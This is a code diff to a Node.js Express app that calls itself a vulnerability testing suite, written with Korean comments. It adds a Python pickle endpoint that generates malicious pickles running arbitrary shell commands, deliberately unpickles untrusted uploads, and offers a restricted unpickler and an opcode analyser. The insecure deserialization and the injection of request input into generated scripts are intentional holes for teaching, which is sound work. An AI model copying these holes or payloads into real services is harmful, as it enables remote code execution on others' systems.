@@ -23,10 +23,10 @@ try {
 }
 
 const app = express();
-const port = 3000;
+const port = process.env.PORT || 3001;
 
 // Multer configuration for file uploads
-const uploadDir = process.env.NODE_ENV === 'development' ? './uploads/' : '/app/uploads/';
+const uploadDir = './uploads/';
 const upload = multer({ 
     dest: uploadDir,
     limits: { fileSize: 5 * 1024 * 1024 } // 5MB limit
@@ -533,8 +533,353 @@ curl -X POST http://localhost:3000/java/vulnerable_deserialize \\
     res.send(html);
 });
 
+// Python Pickle Deserialization 엔드포인트 추가
+const { spawn, exec } = require('child_process');
+const path = require('path');
+
+// Health check endpoint
+app.get('/health', (req, res) => {
+    res.json({ status: 'ok', message: 'Node.js server is running' });
+});
+
+// Python Pickle 처리 엔드포인트
+app.post('/pickle', (req, res) => {
+    const { action, data, command, safe, allowed_modules } = req.body;
+    
+    switch (action) {
+        case 'pickle_load':
+            handlePickleLoad(req, res, data, safe, allowed_modules);
+            break;
+        case 'generate_pickle':
+            generateMaliciousPickle(req, res, command);
+            break;
+        case 'analyze_pickle':
+            analyzePickle(req, res, data);
+            break;
+        default:
+            res.json({ success: false, error: 'Unknown action' });
+    }
+});
+
+function handlePickleLoad(req, res, base64Data, safe = false, allowedModules = []) {
+    try {
+        const pickleData = Buffer.from(base64Data, 'base64');
+        const tempFile = path.join(__dirname, 'temp_pickle.pkl');
+        
+        // 임시 파일에 pickle 데이터 저장
+        fs.writeFileSync(tempFile, pickleData);
+        
+        // Python 스크립트 생성
+        const pythonScript = safe ? createSafePickleScript(tempFile, allowedModules) : createVulnerablePickleScript(tempFile);
+        const scriptFile = path.join(__dirname, 'pickle_loader.py');
+        
+        fs.writeFileSync(scriptFile, pythonScript);
+        
+        // Python 스크립트 실행
+        exec(`python3 "${scriptFile}"`, { timeout: 10000 }, (error, stdout, stderr) => {
+            // 임시 파일 정리
+            try {
+                fs.unlinkSync(tempFile);
+                fs.unlinkSync(scriptFile);
+            } catch (e) {
+                console.warn('임시 파일 정리 실패:', e.message);
+            }
+            
+            if (error) {
+                res.json({ 
+                    success: false, 
+                    error: `Python 실행 오류: ${error.message}`,
+                    stderr: stderr
+                });
+                return;
+            }
+            
+            try {
+                const result = JSON.parse(stdout);
+                res.json(result);
+            } catch (parseError) {
+                res.json({
+                    success: true,
+                    result: stdout,
+                    stderr: stderr,
+                    warning: stderr ? '표준 오류 출력이 감지되었습니다.' : undefined
+                });
+            }
+        });
+        
+    } catch (error) {
+        res.json({ success: false, error: error.message });
+    }
+}
+
+function generateMaliciousPickle(req, res, command = 'whoami') {
+    try {
+        const pythonScript = `
+import pickle
+import base64
+import json
+import subprocess
+import sys
+
+class MaliciousPickle:
+    def __reduce__(self):
+        return (subprocess.check_output, (["""${command}"""], {'shell': True, 'text': True}))
+
+try:
+    # 악성 객체 생성
+    malicious_obj = MaliciousPickle()
+    
+    # pickle로 직렬화
+    pickled_data = pickle.dumps(malicious_obj)
+    
+    # Base64 인코딩
+    base64_data = base64.b64encode(pickled_data).decode('utf-8')
+    
+    result = {
+        "success": True,
+        "pickle_data": base64_data,
+        "command": """${command}""",
+        "size": len(pickled_data),
+        "warning": "이 pickle 데이터는 역직렬화 시 명령어를 실행합니다!"
+    }
+    
+    print(json.dumps(result))
+    
+except Exception as e:
+    print(json.dumps({
+        "success": False,
+        "error": str(e)
+    }))
+`;
+        
+        const scriptFile = path.join(__dirname, 'pickle_generator.py');
+        fs.writeFileSync(scriptFile, pythonScript);
+        
+        exec(`python3 "${scriptFile}"`, { timeout: 10000 }, (error, stdout, stderr) => {
+            try {
+                fs.unlinkSync(scriptFile);
+            } catch (e) {
+                console.warn('임시 파일 정리 실패:', e.message);
+            }
+            
+            if (error) {
+                res.json({ 
+                    success: false, 
+                    error: `Python 실행 오류: ${error.message}`,
+                    stderr: stderr
+                });
+                return;
+            }
+            
+            try {
+                const result = JSON.parse(stdout);
+                res.json(result);
+            } catch (parseError) {
+                res.json({ success: false, error: 'Python 결과 파싱 실패', output: stdout });
+            }
+        });
+        
+    } catch (error) {
+        res.json({ success: false, error: error.message });
+    }
+}
+
+function analyzePickle(req, res, base64Data) {
+    try {
+        const pickleData = Buffer.from(base64Data, 'base64');
+        const tempFile = path.join(__dirname, 'temp_analyze.pkl');
+        
+        fs.writeFileSync(tempFile, pickleData);
+        
+        const pythonScript = `
+import pickle
+import pickletools
+import json
+import sys
+import io
+
+def analyze_pickle(pickle_file):
+    try:
+        # pickle 파일 읽기
+        with open(pickle_file, 'rb') as f:
+            pickle_data = f.read()
+        
+        # pickletools로 분석
+        output = io.StringIO()
+        pickletools.dis(pickle_data, output)
+        opcodes = output.getvalue().split('\\n')
+        
+        # 위험한 연산 감지
+        dangerous_ops = []
+        modules_imported = []
+        risk_level = 'low'
+        
+        for line in opcodes:
+            if 'GLOBAL' in line and ('os' in line or 'subprocess' in line or 'sys' in line):
+                dangerous_ops.append(line.strip())
+                modules_imported.append(line.split()[-1] if line.split() else '')
+                risk_level = 'high'
+            elif 'REDUCE' in line:
+                dangerous_ops.append('REDUCE operation detected')
+                if risk_level == 'low':
+                    risk_level = 'medium'
+            elif 'BUILD' in line or 'INST' in line:
+                if risk_level == 'low':
+                    risk_level = 'medium'
+        
+        # pickle 버전 감지
+        version = 'Unknown'
+        if pickle_data[0:1] == b'\\x80':
+            if len(pickle_data) > 1:
+                version = f'Protocol {pickle_data[1]}'
+        
+        result = {
+            "success": True,
+            "analysis": {
+                "version": version,
+                "risk_level": risk_level,
+                "dangerous_operations": dangerous_ops,
+                "modules_imported": list(set(modules_imported)),
+                "opcodes": [op for op in opcodes if op.strip()][:20]  # 처음 20개만
+            }
+        }
+        
+        print(json.dumps(result))
+        
+    except Exception as e:
+        print(json.dumps({
+            "success": False,
+            "error": str(e)
+        }))
+
+analyze_pickle("${tempFile}")
+`;
+        
+        const scriptFile = path.join(__dirname, 'pickle_analyzer.py');
+        fs.writeFileSync(scriptFile, pythonScript);
+        
+        exec(`python3 "${scriptFile}"`, { timeout: 10000 }, (error, stdout, stderr) => {
+            try {
+                fs.unlinkSync(tempFile);
+                fs.unlinkSync(scriptFile);
+            } catch (e) {
+                console.warn('임시 파일 정리 실패:', e.message);
+            }
+            
+            if (error) {
+                res.json({ 
+                    success: false, 
+                    error: `Python 실행 오류: ${error.message}`,
+                    stderr: stderr
+                });
+                return;
+            }
+            
+            try {
+                const result = JSON.parse(stdout);
+                res.json(result);
+            } catch (parseError) {
+                res.json({ success: false, error: 'Python 결과 파싱 실패', output: stdout });
+            }
+        });
+        
+    } catch (error) {
+        res.json({ success: false, error: error.message });
+    }
+}
+
+function createVulnerablePickleScript(pickleFile) {
+    return `
+import pickle
+import json
+import sys
+import subprocess
+
+def vulnerable_pickle_load(pickle_file):
+    try:
+        with open(pickle_file, 'rb') as f:
+            # 🚨 취약한 역직렬화 - 모든 pickle 데이터를 무조건 로드
+            result = pickle.load(f)
+        
+        return {
+            "success": True,
+            "result": str(result),
+            "warning": "취약한 pickle.load()가 실행되었습니다!",
+            "executed_command": "pickle.load()로 임의 코드가 실행될 수 있습니다"
+        }
+        
+    except subprocess.CalledProcessError as e:
+        return {
+            "success": True,
+            "result": "명령어 실행됨",
+            "executed_command": str(e.cmd),
+            "command_output": e.output if hasattr(e, 'output') else str(e),
+            "warning": "🚨 RCE 성공: 시스템 명령어가 실행되었습니다!"
+        }
+    except Exception as e:
+        return {
+            "success": False,
+            "error": str(e),
+            "warning": "역직렬화 중 오류가 발생했지만 이미 코드가 실행되었을 수 있습니다."
+        }
+
+result = vulnerable_pickle_load("${pickleFile}")
+print(json.dumps(result))
+`;
+}
+
+function createSafePickleScript(pickleFile, allowedModules) {
+    const allowedList = allowedModules.join('", "');
+    
+    return `
+import pickle
+import json
+import sys
+import io
+
+class RestrictedUnpickler(pickle.Unpickler):
+    def find_class(self, module, name):
+        # 허용된 모듈만 허용
+        allowed_modules = ["${allowedList}"]
+        if module in allowed_modules:
+            return getattr(__import__(module), name)
+        raise pickle.UnpicklingError(f"Forbidden class: {module}.{name}")
+
+def safe_pickle_load(pickle_file):
+    try:
+        with open(pickle_file, 'rb') as f:
+            # 🔒 안전한 역직렬화 - 제한된 클래스만 허용
+            unpickler = RestrictedUnpickler(f)
+            result = unpickler.load()
+        
+        return {
+            "success": True,
+            "result": str(result),
+            "message": "안전한 역직렬화가 성공했습니다",
+            "allowed_modules": ["${allowedList}"]
+        }
+        
+    except pickle.UnpicklingError as e:
+        return {
+            "success": False,
+            "error": str(e),
+            "message": "보안 정책에 의해 차단되었습니다",
+            "security_status": "blocked_by_policy"
+        }
+    except Exception as e:
+        return {
+            "success": False,
+            "error": str(e)
+        }
+
+result = safe_pickle_load("${pickleFile}")
+print(json.dumps(result))
+`;
+}
+
 app.listen(port, () => {
     console.log(`🚀 Node.js Vulnerability Testing Suite listening at http://localhost:${port}`);
     console.log(`📊 Prototype Pollution endpoint: POST /prototype_pollution`);
     console.log(`☕ Java Deserialization endpoints: /java/*`);
+    console.log(`🐍 Python Pickle endpoints: POST /pickle`);
 });
